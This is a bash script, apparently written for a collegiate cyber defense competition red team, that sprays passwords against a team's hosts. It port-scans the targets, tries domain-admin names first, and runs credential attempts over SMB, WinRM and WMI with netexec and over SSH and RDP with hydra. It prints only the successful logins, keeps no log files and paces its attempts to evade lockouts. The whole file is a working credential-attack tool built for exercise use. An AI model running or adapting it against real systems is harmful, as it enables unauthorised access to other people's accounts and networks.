#!/bin/bash
# ================================================
# CCDC Red Team Password Spray Script
# Targets: 192.168.20<TEAM>.* (external) or 172.16.*.* (internal via -x)
# Uses: users.txt + passwords.txt (spray style = 1 pass → all users)
# Protocols: SMB → WinRM → WMI (netexec) | SSH → RDP (hydra)
# Pre-checks port availability, skips closed services
# Only prints successful creds — no log files
#
# Default: stop spraying a host after first hit, continue to other hosts
# -a flag : continue spraying everything (all users × all hosts × all protocols)
# -x flag : use internal 172.16.x.x IPs (for proxychains pivot)
# -s flag : skip specific hosts by name or number
# DA accounts are tried first before users.txt entries
#
# If spraying a host takes >30s, you'll be prompted to skip it.
# ================================================

set -euo pipefail

usage() {
  echo "Usage: $0 <team_number> [-a] [-x] [-u user1] [-s host1] ..."
  echo "  -a          continue-on-success: keep spraying after first hit"
  echo "  -x          use internal 172.16.x.x IPs (proxychains/pivot mode)"
  echo "  -u USER     add USER to the front of the spray list (repeatable)"
  echo "  -s HOST     skip this host (name or 1-7, repeatable)"
  echo ""
  echo "  Hosts: 1=curiosity 2=morality 3=intelligence 4=anger 5=fact 6=space 7=adventure"
  echo "  If spraying a host takes >30s, you'll be prompted to skip it."
  exit 1
}

CONTINUE_ALL=0
USE_INTERNAL=0
EXTRA_USERS=()
SKIP_HOSTS=()   # hosts to skip entirely
HOST_TIMEOUT=30 # seconds before offering to skip a host

# Host name/number mapping for -s flag
declare -A _NUM_TO_HOST=(
  [1]="curiosity" [2]="morality" [3]="intelligence"
  [4]="anger" [5]="fact" [6]="space" [7]="adventure"
)
declare -A _HOST_OCTET=(
  ["curiosity"]=140  ["morality"]=10  ["intelligence"]=11
  ["anger"]=70       ["fact"]=71      ["space"]=141
  ["adventure"]=72
)

if [[ $# -lt 1 ]]; then usage; fi
TEAM="$1"; shift

while getopts "axu:s:" opt; do
  case "$opt" in
    a) CONTINUE_ALL=1 ;;
    x) USE_INTERNAL=1 ;;
    u) EXTRA_USERS+=("$OPTARG") ;;
    s)
      # Accept host name or number
      if [[ "$OPTARG" =~ ^[1-7]$ ]]; then
        SKIP_HOSTS+=("${_NUM_TO_HOST[$OPTARG]}")
      elif [[ -n "${_HOST_OCTET[$OPTARG]:-}" ]]; then
        SKIP_HOSTS+=("$OPTARG")
      else
        echo "[-] Unknown host for -s: '$OPTARG'"
        echo "    Valid: curiosity morality intelligence anger fact space adventure (or 1-7)"
        exit 1
      fi
      ;;
    *) usage ;;
  esac
done

# Ordered host list (same order as IPS array)
HOST_NAMES=(curiosity morality intelligence anger fact space adventure)

if [[ $USE_INTERNAL -eq 1 ]]; then
  IPS=(
    "172.16.3.140"  # curiosity
    "172.16.1.10"   # morality
    "172.16.1.11"   # intelligence
    "172.16.2.70"   # anger
    "172.16.2.71"   # fact
    "172.16.3.141"  # space
    "172.16.2.72"   # adventure
  )
  echo "[*] Mode: INTERNAL IPs (172.16.x.x — proxychains pivot)"
else
  BASE="192.168.20${TEAM}."
  IPS=(
    "${BASE}140"  # curiosity
    "${BASE}10"   # morality
    "${BASE}11"   # intelligence
    "${BASE}70"   # anger
    "${BASE}71"   # fact
    "${BASE}141"  # space
    "${BASE}72"   # adventure
  )
fi

# Build IP-to-hostname map and apply -s skips
declare -A IP_TO_HOST
declare -A SKIP_IPS
for i in "${!IPS[@]}"; do
  IP_TO_HOST["${IPS[$i]}"]="${HOST_NAMES[$i]}"
done

for skip in "${SKIP_HOSTS[@]}"; do
  for i in "${!HOST_NAMES[@]}"; do
    if [[ "${HOST_NAMES[$i]}" == "$skip" ]]; then
      SKIP_IPS["${IPS[$i]}"]=1
      echo "[*] Skipping ${skip} (${IPS[$i]})"
    fi
  done
done

# Filter out skipped hosts from IPS
FILTERED_IPS=()
for ip in "${IPS[@]}"; do
  [[ -z "${SKIP_IPS[$ip]:-}" ]] && FILTERED_IPS+=("$ip")
done
IPS=("${FILTERED_IPS[@]}")

USERS_FILE="users.txt"
PASSES="passwords.txt"
DOMAIN="aperturesciencelabs.org"
TIMEOUT=2    # seconds for port check
GOT_ACCESS=0

# Per-IP hit tracking: once we get a hit on an IP, skip it for remaining attempts
declare -A HIT_IPS

# Per-IP spray start time: for 30s timeout prompt
declare -A HOST_START_TIME

# Track dynamically skipped hosts
declare -A DYNAMIC_SKIP_IPS

# ============== BUILD USER LIST (explicit → DA → users.txt) ==============
DA_USERS=(Administrator caroline cave chell glados wheatley)
ALL_USERS=()

# Explicitly supplied -u users go first
for u in "${EXTRA_USERS[@]}"; do
  ALL_USERS+=("$u")
done

# DA accounts next (skip if already added via -u)
for u in "${DA_USERS[@]}"; do
  already=0
  for existing in "${ALL_USERS[@]}"; do
    [[ "${existing,,}" == "${u,,}" ]] && { already=1; break; }
  done
  [[ $already -eq 0 ]] && ALL_USERS+=("$u")
done

if [[ -f "$USERS_FILE" ]]; then
  while IFS= read -r u || [[ -n "$u" ]]; do
    [[ -z "$u" ]] && continue
    already=0
    for da in "${DA_USERS[@]}"; do
      [[ "${u,,}" == "${da,,}" ]] && { already=1; break; }
    done
    [[ $already -eq 0 ]] && ALL_USERS+=("$u")
  done < "$USERS_FILE"
fi

# Check files exist
if [[ ! -f "$PASSES" ]]; then
  echo "[-] ERROR: passwords.txt not found in current directory!"
  exit 1
fi

if [[ ${#ALL_USERS[@]} -eq 0 ]]; then
  echo "[-] ERROR: no users loaded (users.txt missing or empty and DA list is empty)"
  exit 1
fi

# Check tools
if ! command -v netexec >/dev/null 2>&1; then
  echo "[-] ERROR: netexec not found! Install with: pipx install netexec"
  exit 1
fi
HAVE_HYDRA=0
command -v hydra >/dev/null 2>&1 && HAVE_HYDRA=1

# ============== PORT CHECK ==============
port_open() {
  local ip="$1" port="$2"
  timeout "$TIMEOUT" bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null
}

proto_port() {
  case "$1" in
    smb)   echo 445 ;;
    winrm) echo 5985 ;;
    wmi)   echo 135 ;;
    ssh)   echo 22 ;;
    rdp)   echo 3389 ;;
  esac
}

# ============== PRE-SCAN ==============
declare -A LIVE_TARGETS

prescan() {
  local proto="$1"
  local port live=()
  port=$(proto_port "$proto")
  for ip in "${IPS[@]}"; do
    port_open "$ip" "$port" && live+=("$ip")
  done
  LIVE_TARGETS["$proto"]="${live[*]:-}"
}

echo "[*] Pre-scanning ports on ${#IPS[@]} targets..."
for proto in smb winrm wmi ssh rdp; do
  prescan "$proto"
  count=$(echo "${LIVE_TARGETS[$proto]}" | wc -w)
  port=$(proto_port "$proto")
  if [[ "$count" -gt 0 ]]; then
    echo "  [+] ${proto^^} (port ${port}): ${count} host(s) alive"
  else
    echo "  [-] ${proto^^} (port ${port}): no hosts — will skip"
  fi
done

echo "[*] Users: ${#ALL_USERS[@]} (${#EXTRA_USERS[@]} explicit + ${#DA_USERS[@]} DA + $((${#ALL_USERS[@]}-${#DA_USERS[@]}-${#EXTRA_USERS[@]})) from users.txt)"
[[ $CONTINUE_ALL -eq 1 ]] && echo "[*] Mode: full spray (all users × all hosts)" || echo "[*] Mode: stop-per-host (skip host after first hit)"
[[ ${#SKIP_HOSTS[@]} -gt 0 ]] && echo "[*] Skipped hosts: ${SKIP_HOSTS[*]}"
echo "[*] Host timeout: ${HOST_TIMEOUT}s (will prompt to skip slow hosts)"
echo "[*] Starting spray for TEAM ${TEAM} at $(date)"
echo ""

# ============== HIT HANDLER ==============
record_hit() {
  local ip="$1" result="$2"
  echo "$result"
  GOT_ACCESS=1
  if [[ $CONTINUE_ALL -eq 0 ]]; then
    HIT_IPS["$ip"]=1
  fi
}

# Check if an IP has already been hit (skip it unless -a) or dynamically skipped
ip_done() {
  local ip="$1"
  [[ -n "${DYNAMIC_SKIP_IPS[$ip]:-}" ]] && return 0
  [[ $CONTINUE_ALL -eq 0 && -n "${HIT_IPS[$ip]:-}" ]]
}

# Check if we've been spraying this host for >30s and prompt to skip
check_host_timeout() {
  local ip="$1"
  local host_name="${IP_TO_HOST[$ip]:-$ip}"
  local start="${HOST_START_TIME[$ip]:-}"
  [[ -z "$start" ]] && return 0

  local now elapsed
  now=$(date +%s)
  elapsed=$((now - start))

  if [[ $elapsed -ge $HOST_TIMEOUT && -z "${DYNAMIC_SKIP_IPS[$ip]:-}" ]]; then
    echo ""
    echo "  [!] Spraying ${host_name} (${ip}) has taken ${elapsed}s (>${HOST_TIMEOUT}s)"
    read -t 10 -rp "  [?] Skip this host? [Y/n] (auto-continues in 10s): " answer </dev/tty || answer=""
    if [[ -z "$answer" || "${answer,,}" == "y" || "${answer,,}" == "yes" ]]; then
      echo "  [*] Skipping ${host_name} for the rest of this spray"
      DYNAMIC_SKIP_IPS["$ip"]=1
      return 1
    else
      echo "  [*] Continuing ${host_name}..."
      # Set start time far in future so we don't re-prompt
      HOST_START_TIME["$ip"]=$((now + 999999))
    fi
  fi
  return 0
}

# Mark the start of spraying a new host
mark_host_start() {
  local ip="$1"
  if [[ -z "${HOST_START_TIME[$ip]:-}" ]]; then
    HOST_START_TIME["$ip"]=$(date +%s)
  fi
}

# ============== SINGLE-ATTEMPT HELPERS ==============
# Returns 0 and calls record_hit if successful, 1 otherwise.

try_nxc() {
  local proto="$1" ip="$2" user="$3" pass="$4"
  local result
  result=$(netexec "$proto" "$ip" \
    -u "$user" -p "$pass" -d "$DOMAIN" \
    2>/dev/null | grep -i '\[+\]' || true)
  if [[ -n "$result" ]]; then
    record_hit "$ip" "$result"
    return 0
  fi
  return 1
}

try_hydra() {
  local proto="$1" ip="$2" user="$3" pass="$4"
  local result
  result=$(hydra -l "$user" -p "$pass" -t 4 -W 2 "${proto}://${ip}" 2>/dev/null \
    | grep -i 'login:' || true)
  if [[ -n "$result" ]]; then
    record_hit "$ip" "$result"
    return 0
  fi
  return 1
}

# ============== MAIN SPRAY LOOP ==============
# Order per password: SMB → WinRM → WMI → SSH → RDP
# Inner order: DA users first, then users.txt remainder
# Breaks out immediately on first hit unless -a is set.

while IFS= read -r pass || [[ -n "$pass" ]]; do
  [[ -z "$pass" ]] && continue

  # ---- netexec protocols ----
  for proto in smb winrm wmi; do
    targets="${LIVE_TARGETS[$proto]:-}"
    [[ -z "$targets" ]] && continue

    for ip in $targets; do
      ip_done "$ip" && continue
      mark_host_start "$ip"
      for user in "${ALL_USERS[@]}"; do
        ip_done "$ip" && break
        check_host_timeout "$ip" || break
        try_nxc "$proto" "$ip" "$user" "$pass" || true
      done
    done
  done

  # ---- hydra protocols ----
  if [[ $HAVE_HYDRA -eq 1 ]]; then
    for proto in ssh rdp; do
      targets="${LIVE_TARGETS[$proto]:-}"
      [[ -z "$targets" ]] && continue

      for ip in $targets; do
        ip_done "$ip" && continue
        mark_host_start "$ip"
        for user in "${ALL_USERS[@]}"; do
          ip_done "$ip" && break
          check_host_timeout "$ip" || break
          try_hydra "$proto" "$ip" "$user" "$pass" || true
        done
      done
    done
  fi

  # Delay between passwords to avoid lockouts
  sleep 3
done < "$PASSES"

echo ""
if [[ "$GOT_ACCESS" -eq 0 ]]; then
  echo "[-] access denied — no credentials worked"
else
  echo "[*] Spray complete — see hits above."
fi